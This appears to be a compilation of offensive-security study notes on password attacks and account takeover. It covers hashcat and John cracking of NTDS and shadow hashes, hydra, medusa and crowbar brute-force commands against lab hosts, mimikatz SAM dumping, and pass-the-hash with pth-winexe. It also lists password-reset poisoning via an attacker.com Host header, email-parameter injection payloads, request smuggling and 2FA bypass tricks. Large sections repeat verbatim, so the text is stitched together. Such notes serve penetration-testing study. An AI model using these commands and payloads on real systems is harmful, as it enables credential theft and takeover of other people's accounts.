## Hashcat

apt install cmake build-essential -y
apt install checkinstall git -y
git clone https://github.com/hashcat/hashcat.git && cd hashcat && make -j 8 && make install
1.  Extract the hash
2.  Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes
3.  Establish a cracking stratgy based on hash format (ex: wordlist -> wordlist + rules -> mask -> combinator mode -> prince attack -> ...)
4.  Enjoy plains
5.  Review strategy
6.  Start over

# Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d 
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?l?l?d?d?1
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?l?l?l?d?d?1 

# Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?d?d?d?d?1
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?l?d?d?d?d?1

# Mask: lower*6 + digit*2 + special digit(+!?*)
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?l?l?l?l?l?l?d?d?1
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?l?l?l?l?l?l?d?d?1?1

# Mask: lower*6 + digit*2
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1

# Other examples
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a 
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d
hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a?a?a?a?a"
hashcat --attack-mode 3 --hash-type $number $hashes_file "?u?l?l?l?d?d?d?d?s"
hashcat --attack-mode 3 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a"
hashcat --attack-mode 3 --custom-charset1 "?u" --custom-charset2 "?l?u?d" --custom-charset3 "?d" --hash-type $number $hashes_file "?1?2?2?2?3"
``` 
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d 
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?l?l?d?d?1
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?l?l?l?d?d?1 

# Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?d?d?d?d?1
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?u?l?l?l?l?d?d?d?d?1

# Mask: lower*6 + digit*2 + special digit(+!?*)
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?l?l?l?l?l?l?d?d?1
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 "*+!??" ?l?l?l?l?l?l?d?d?1?1

# Mask: lower*6 + digit*2
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1

# Other examples
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a 
hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d
hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a?a?a?a?a"
hashcat --attack-mode 3 --hash-type $number $hashes_file "?u?l?l?l?d?d?d?d?s"
hashcat --attack-mode 3 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a"
hashcat --attack-mode 3 --custom-charset1 "?u" --custom-charset2 "?l?u?d" --custom-charset3 "?d" --hash-type $number $hashes_file "?1?2?2?2?3"

### Dictionary

> Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash.

```powershell
hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules
```


# HTTP htaccess password attack with medusa

decompress the rockyou wordlist:

```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

# password Attack against Remote Desktop Protocal with crowbar

```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1  
```

-n number of threads
-b protocal
-s host
-u username
-C wordlist

rdp does not reliably handle multiple threads, so we use single thread

# SSH Attack with THC-Hydra

-l target username
-P wordlist
protocal://IP

```
hydra -l kali -P test_wdlist.txt ssh://127.0.0.1
```

# HTTP post attack with THC-Hydra

obtain addtional info about http-form-post options

```
hydra http-form-post -U 

<url>:<form parameters>:<condition string>[:<optional>[:<optional>]
```

```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

request verbose output with -vV, and use -f to stop the attack when the first successful result is found.

# Retrieve Password hashes

`hashid <hashvalue>` to identify hash type

inspect /etc/shadow file

```
sudo grep root /etc/shadow
```

```
root:$6$18cMHZ.mB57eU82l$lim7jazX00mXUZEB43IOtlHmpFcuTrceOJ1QObdaGr5fwsfsEryh5xcuJEpH7qOyiOmQHcGkn33vhy66GQDAi1:18696:0:99999:7:::
```
# HTTP htaccess password attack with medusa

decompress the rockyou wordlist:

```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

# password Attack against Remote Desktop Protocal with crowbar

```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1  
```

-n number of threads
-b protocal
-s host
-u username
-C wordlist

rdp does not reliably handle multiple threads, so we use single thread

# SSH Attack with THC-Hydra

-l target username
-P wordlist
protocal://IP

```
hydra -l kali -P test_wdlist.txt ssh://127.0.0.1
```

# HTTP post attack with THC-Hydra

obtain addtional info about http-form-post options

```
hydra http-form-post -U 

<url>:<form parameters>:<condition string>[:<optional>[:<optional>]
```

```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

request verbose output with -vV, and use -f to stop the attack when the first successful result is found.

# Retrieve Password hashes

`hashid <hashvalue>` to identify hash type

inspect /etc/shadow file

```
sudo grep root /etc/shadow
```

```
root:$6$18cMHZ.mB57eU82l$lim7jazX00mXUZEB43IOtlHmpFcuTrceOJ1QObdaGr5fwsfsEryh5xcuJEpH7qOyiOmQHcGkn33vhy66GQDAi1:18696:0:99999:7:::
```

the first of which ($6) references the SHA-512 algorithm

- $1 = MD5 hashing algorithm.
- $2 =Blowfish Algorithm is in use.
- $2a=eksblowfish Algorithm
- $5 =SHA-256 Algorithm
- $6 =SHA-512 Algorithm
    18cMHZ.mB57eU82l the salt

SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file.

mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.

```
C:\Tools\password_attacks\mimikatz.exe
> privilege::debug
> token::elevate
> lsadump::sam
```

token::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity. If mimikatz is launched from a SYSTEM shell, this step is not required.

use lsadump::sam to dump the contents of the SAM database

# Passing the hash in windows

The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a
remote target by using a valid combination of username and NTLM/LM hash rather than a clear
text password. This is possible because NTLM/LM password hashes are not salted and remain
static between sessions. Moreover, if we discover a password hash on one target, we cannot only
use it to authenticate to that target, we can use it to authenticate to another target as well, as long
as that target has an account with the same username and password.

Security Accounts Manager (SAM)

To do this, we will use pth-winexe from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol

```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

Question: what does "aad3b435b51404eeaad3b435b51404ee" do ? why there are two hashes?
aad3b435b51404eeaad3b435b51404ee: Empty LM HASH `<LM hash>:<NTLM hash>`

NTLM hash algorithn:

```
MD4(UTF-16-LE(password))
```

Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM
version 1 or 2 format during the authentication process. We can capture these hashes using
man-in-the-middle or poisoning attacks and either crack them or relay them

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

# Password cracking

recover clear text password from hash

```
john hash.txt --format=NT
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

```
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

## use john with linux password

```
grep victim /etc/passwd > test_pw.txt
sudo grep victim /etc/shadow > test_shadow.txt
unshadow test_pw.txt test_shadow.txt > test_unshadow.txt
john est_unshadow.txt
```

john need the unshadow format as input hash

I created a victim user, but the hash type is $y$ which can not be cracked
the first of which ($6) references the SHA-512 algorithm

- $1 = MD5 hashing algorithm.
- $2 =Blowfish Algorithm is in use.
- $2a=eksblowfish Algorithm
- $5 =SHA-256 Algorithm
- $6 =SHA-512 Algorithm
    18cMHZ.mB57eU82l the salt

SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file.

mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.

```
C:\Tools\password_attacks\mimikatz.exe
> privilege::debug
> token::elevate
> lsadump::sam
```

token::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity. If mimikatz is launched from a SYSTEM shell, this step is not required.

use lsadump::sam to dump the contents of the SAM database

# Passing the hash in windows

The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a
remote target by using a valid combination of username and NTLM/LM hash rather than a clear
text password. This is possible because NTLM/LM password hashes are not salted and remain
static between sessions. Moreover, if we discover a password hash on one target, we cannot only
use it to authenticate to that target, we can use it to authenticate to another target as well, as long
as that target has an account with the same username and password.

Security Accounts Manager (SAM)

To do this, we will use pth-winexe from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol

```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

Question: what does "aad3b435b51404eeaad3b435b51404ee" do ? why there are two hashes?
aad3b435b51404eeaad3b435b51404ee: Empty LM HASH `<LM hash>:<NTLM hash>`

NTLM hash algorithn:

```
MD4(UTF-16-LE(password))
```

Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM
version 1 or 2 format during the authentication process. We can capture these hashes using
man-in-the-middle or poisoning attacks and either crack them or relay them

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

# Password cracking

recover clear text password from hash

```
john hash.txt --format=NT
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

```
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

## use john with linux password

```
grep victim /etc/passwd > test_pw.txt
sudo grep victim /etc/shadow > test_shadow.txt
unshadow test_pw.txt test_shadow.txt > test_unshadow.txt
john est_unshadow.txt
```

john need the unshadow format as input hash

I created a victim user, but the hash type is $y$ which can not be cracked


## Password Reset Feature

### Password Reset Token Leak Via Referrer

1.  Request password reset to your email address
2.  Click on the password reset link
3.  Don't change password
4.  Click any 3rd party websites(eg: Facebook, twitter)
5.  Intercept the request in Burp Suite proxy
6.  Check if the referer header is leaking password reset token.

### Account Takeover Through Password Reset Poisoning

1.  Intercept the password reset request in Burp Suite
2.  Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3.  Forward the request with the modified header
    
    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```
    
4.  Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter

```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### IDOR on API Parameters

1.  Attacker have to login with their account and go to the **Change password** feature.
2.  Start the Burp Suite and Intercept the request
3.  Send it to the repeater tab and edit the parameters : User ID/email
    
    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```
    

### Weak Password Reset Token

The password reset token should be randomly generated and unique every time.
Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence (<6 characters between [A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token

1.  Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2.  Inspect the server response and check for `resetToken`
3.  Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision

1.  Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
2.  Request a password reset with your malicious username.
3.  Use the token sent to your email and reset the victim password.
4.  Connect to the victim account with the new password.

The platform CTFd was vulnerable to this attack.
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account takeover due to unicode normalization issue

When processing user input involving unicode for case mapping or normalisation, unexcepted behavior can occur.

- Victim account: `demo@gmail.com`
- Attacker account: `demⓞ@gmail.com`

[Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).

[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.

## Account Takeover Via Cross Site Scripting

1.  Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
2.  Leak the current **sessions cookie**
3.  Authenticate as the user using the cookie

## Account Takeover Via HTTP Request Smuggling

Refer to **HTTP Request Smuggling** vulnerability page.

1.  Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
    
    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```
    
2.  Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
    
    ```powershell
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: 
    ```
    
3.  Final request could look like the following
    
    ```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83
    
    0
    
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: X
    ```
    

Hackerone reports exploiting this bug

- https://hackerone.com/reports/737140
- https://hackerone.com/reports/771666

## Account Takeover via CSRF

1.  Create a payload for the CSRF, e.g: "HTML form with auto submit for a password change"
2.  Send the payload

## Account Takeover via JWT

JSON Web Token might be used to authenticate an user.

- Edit the JWT with another User ID / Email
- Check for weak JWT signature

## 2FA Bypasses

### Response Manipulation

In response if `"success":false`
Change it to `"success":true`

### Status Code Manipulation

If Status Code is **4xx**
Try to change it to **200 OK** and see if it bypass restrictions

### 2FA Code Leakage in Response

Check the response of the 2FA Code Triggering Request to see if the code is leaked.

### JS File Analysis

Rare but some JS Files may contain info about the 2FA Code, worth giving a shot

### 2FA Code Reusability

Same code can be reused

### Lack of Brute-Force Protection

Possible to brute-force any length 2FA Code

### Missing 2FA Code Integrity Validation

Code for any user acc can be used to bypass the 2FA

### CSRF on 2FA Disabling

No CSRF Protection on disabling 2FA, also there is no auth confirmation

### Password Reset Disable 2FA

2FA gets disabled on password change/email change

### Backup Code Abuse

Bypassing 2FA by abusing the Backup code feature
Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions

### Clickjacking on 2FA Disabling Page

Iframing the 2FA Disabling page and social engineering victim to disable the 2FA

### Enabling 2FA doesn't expire Previously active Sessions

If the session is already hijacked and there is a session timeout vuln

### Bypass 2FA by Force Browsing

If the application redirects to `/my-account` url upon login while 2Fa is disabled, try replacing `/2fa/verify` with `/my-account` while 2FA is enabled to bypass verification.

### Bypass 2FA with null or 000000

Enter the code **000000** or **null** to bypass 2FA protection.

### Bypass 2FA with array

```json
{
    "otp":[
        "1234",
        "1111",
        "1337", // GOOD OTP
        "2222",
        "3333",
        "4444",
        "5555"
    ]
}
```
